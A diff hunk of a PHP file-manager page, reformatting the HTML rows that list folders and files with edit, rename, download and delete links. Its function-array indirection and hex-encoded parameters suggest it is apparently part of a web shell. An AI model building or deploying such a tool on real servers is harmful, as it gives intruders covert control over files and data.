@@ -155,37 +155,14 @@ function deldir($d) {
 				$scD = $func[5]($scD($p), [".", ".."]);
 				foreach ($scD as $d) {
 					if (!$func[6]("$p/$d")) continue;
-					echo "
-					<tr>
-						<td><a href=\"?p=".hex("$p/$d")."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$func[19]("Y-m-d H:i", $func[20]("$p/$d"))."\"><i class=\"fa fa-fw fa-folder\"></i> {$d}</a></td>
-						<td>N/A</td>
-						<td><font color=\"".(($func[8]("$p/$d")) ? "#00ff00" : (!$func[9]("$p/$d") ? "red" : null))."\">".perms("$p/$d")."</font></td>
-						<td>
-							<a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($d)."&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>
-							<a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($d)."\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>
-						</td>
-					</tr>";
+					echo "<tr><td><a href=\"?p=".hex("$p/$d")."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$func[19]("Y-m-d H:i", $func[20]("$p/$d"))."\"><i class=\"fa fa-fw fa-folder\"></i> {$d}</a></td><td>N/A</td><td><font color=\"".(($func[8]("$p/$d")) ? "#00ff00" : (!$func[9]("$p/$d") ? "red" : null))."\">".perms("$p/$d")."</font></td><td><a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($d)."&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($d)."\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></td></tr>";
 				}
 				foreach ($scD as $f) {
 					if (!$func[7]("$p/$f")) continue;
 					$size = $func[10]("$p/$f")/1024;
 					$size = round($size, 3);
 					$size = ($size > 1024) ? round($size/1024, 2)."MB" : $size."KB";
-					echo "
-					<tr>
-						<td><a href=\"?p=".hex($p)."&a=".hex("view")."&n=".hex($f)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$func[19]("Y-m-d H:i", $func[20]("$p/$f"))."\"><i class=\"fa fa-fw fa-file\"></i> {$f}</a></td>
-						<td>{$size}</td>
-						<td><font color=\"".(($func[8]("$p/$f")) ? "#00ff00" : (!$func[9]("$p/$f") ? "red" : null))."\">".perms("$p/$f")."</font></td>
-						<td>
-							<div class=\"d-flex justify-content-between\">
-									<a href=\"?p=".hex($p)."&a=".hex("edit")."&n=".hex($f)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a>
-									<a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($f)."&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>
-									<a href=\"?p=".hex($p)."&n=".hex($f)."&download"."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a>
-									<a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($f)."\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>
-							</div>
-						</td>
-					</tr>
-					";
+					echo "<tr><td><a href=\"?p=".hex($p)."&a=".hex("view")."&n=".hex($f)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$func[19]("Y-m-d H:i", $func[20]("$p/$f"))."\"><i class=\"fa fa-fw fa-file\"></i> {$f}</a></td><td>{$size}</td><td><font color=\"".(($func[8]("$p/$f")) ? "#00ff00" : (!$func[9]("$p/$f") ? "red" : null))."\">".perms("$p/$f")."</font></td><td><div class=\"d-flex justify-content-between\"><a href=\"?p=".hex($p)."&a=".hex("edit")."&n=".hex($f)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a><a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($f)."&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=".hex($p)."&n=".hex($f)."&download"."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a><a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($f)."\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></div></td></tr>";
 				}
 				?>
 			</tbody>
